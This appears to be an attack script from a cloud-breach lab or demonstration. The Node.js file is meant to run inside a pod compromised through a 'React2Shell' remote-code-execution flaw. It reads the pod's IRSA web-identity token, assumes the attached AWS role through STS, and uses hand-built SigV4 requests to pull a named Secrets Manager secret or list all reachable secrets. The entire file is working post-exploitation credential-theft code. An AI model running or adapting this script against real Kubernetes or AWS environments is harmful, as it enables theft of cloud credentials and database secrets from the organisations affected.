// steal_secret.js
// Phase 10 — cloud crown-jewel grab using ONLY Node built-ins (no aws CLI/SDK).
//
// Chain: read IRSA projected token -> STS AssumeRoleWithWebIdentity
//        -> Secrets Manager GetSecretValue (SigV4-signed).
//
// Runs inside the compromised pod via the React2Shell RCE. The attacker only
// needs node (already running `next dev`) and the IRSA env vars the EKS
// webhook injects.
//
// Usage (from the RCE):
//   node /tmp/steal_secret.js [secret-id]   # get one secret (default mode)
//   node /tmp/steal_secret.js --list        # list all secrets (blast radius)

const fs = require("fs");
const https = require("https");
const crypto = require("crypto");

const args = process.argv.slice(2).filter((a) => a !== "--list");
const SECRET_ID = args[0] || "react2shell-eks-dev-rds-credential";
const REGION =
  process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION || "ca-central-1";
const ROLE_ARN = process.env.AWS_ROLE_ARN;
const TOKEN_FILE = process.env.AWS_WEB_IDENTITY_TOKEN_FILE;

function httpsRequest({ host, method, path, headers, body }) {
  return new Promise((resolve, reject) => {
    const req = https.request(
      { host, method, path, headers },
      (res) => {
        let data = "";
        res.on("data", (c) => (data += c));
        res.on("end", () => resolve({ status: res.statusCode, body: data }));
      }
    );
    req.on("error", reject);
    if (body) req.write(body);
    req.end();
  });
}

// --- minimal SigV4 ---
function hmac(key, str) {
  return crypto.createHmac("sha256", key).update(str, "utf8").digest();
}
function sha256hex(str) {
  return crypto.createHash("sha256").update(str, "utf8").digest("hex");
}
function signingKey(secret, date, region, service) {
  const kDate = hmac("AWS4" + secret, date);
  const kRegion = hmac(kDate, region);
  const kService = hmac(kRegion, service);
  return hmac(kService, "aws4_request");
}

// 1) STS AssumeRoleWithWebIdentity (query API, no signing needed).
async function assumeRole() {
  const token = fs.readFileSync(TOKEN_FILE, "utf8").trim();
  const params = new URLSearchParams({
    Action: "AssumeRoleWithWebIdentity",
    Version: "2011-06-15",
    RoleArn: ROLE_ARN,
    RoleSessionName: "react2shell",
    WebIdentityToken: token,
  }).toString();

  const res = await httpsRequest({
    host: `sts.${REGION}.amazonaws.com`,
    method: "POST",
    path: "/",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Content-Length": Buffer.byteLength(params),
      Accept: "application/json",
    },
    body: params,
  });

  const j = JSON.parse(res.body);
  const c =
    j.AssumeRoleWithWebIdentityResponse.AssumeRoleWithWebIdentityResult
      .Credentials;
  return {
    accessKeyId: c.AccessKeyId,
    secretAccessKey: c.SecretAccessKey,
    sessionToken: c.SessionToken,
  };
}

// 2) Secrets Manager call, SigV4-signed POST. Generic over the API target so
//    GetSecretValue and ListSecrets share one signer.
async function smCall(creds, target, bodyObj) {
  const service = "secretsmanager";
  const host = `${service}.${REGION}.amazonaws.com`;
  const payload = JSON.stringify(bodyObj);

  const now = new Date();
  const amzDate = now.toISOString().replace(/[:-]|\.\d{3}/g, ""); // YYYYMMDDTHHMMSSZ
  const dateStamp = amzDate.slice(0, 8);

  const canonicalHeaders =
    `content-type:application/x-amz-json-1.1\n` +
    `host:${host}\n` +
    `x-amz-content-sha256:${sha256hex(payload)}\n` +
    `x-amz-date:${amzDate}\n` +
    `x-amz-security-token:${creds.sessionToken}\n` +
    `x-amz-target:${target}\n`;
  const signedHeaders =
    "content-type;host;x-amz-content-sha256;x-amz-date;x-amz-security-token;x-amz-target";

  const canonicalRequest = [
    "POST",
    "/",
    "",
    canonicalHeaders,
    signedHeaders,
    sha256hex(payload),
  ].join("\n");

  const scope = `${dateStamp}/${REGION}/${service}/aws4_request`;
  const stringToSign = [
    "AWS4-HMAC-SHA256",
    amzDate,
    scope,
    sha256hex(canonicalRequest),
  ].join("\n");

  const sig = crypto
    .createHmac("sha256", signingKey(creds.secretAccessKey, dateStamp, REGION, service))
    .update(stringToSign, "utf8")
    .digest("hex");

  const authorization =
    `AWS4-HMAC-SHA256 Credential=${creds.accessKeyId}/${scope}, ` +
    `SignedHeaders=${signedHeaders}, Signature=${sig}`;

  const res = await httpsRequest({
    host,
    method: "POST",
    path: "/",
    headers: {
      "Content-Type": "application/x-amz-json-1.1",
      "X-Amz-Target": target,
      "X-Amz-Date": amzDate,
      "X-Amz-Content-Sha256": sha256hex(payload),
      "X-Amz-Security-Token": creds.sessionToken,
      Authorization: authorization,
      "Content-Length": Buffer.byteLength(payload),
    },
    body: payload,
  });
  return res.body;
}

const getSecret = (creds) =>
  smCall(creds, "secretsmanager.GetSecretValue", { SecretId: SECRET_ID });

// Blast-radius demo: list EVERY secret the broad role can see, proving the
// stolen creds reach far beyond the one intended secret.
const listSecrets = (creds) =>
  smCall(creds, "secretsmanager.ListSecrets", { MaxResults: 100 });

(async () => {
  try {
    if (!ROLE_ARN || !TOKEN_FILE) {
      console.error("No IRSA env (AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE).");
      process.exit(1);
    }
    const mode = process.argv[2] === "--list" ? "list" : "get";
    console.error(
      `[*] role=${ROLE_ARN} region=${REGION} mode=${mode}` +
        (mode === "get" ? ` secret=${SECRET_ID}` : "")
    );
    const creds = await assumeRole();
    console.error(`[*] assumed role, akid=${creds.accessKeyId}`);
    const out = mode === "list" ? await listSecrets(creds) : await getSecret(creds);
    console.log(out);
  } catch (e) {
    console.error("[!] " + (e && e.stack ? e.stack : e));
    process.exit(1);
  }
})();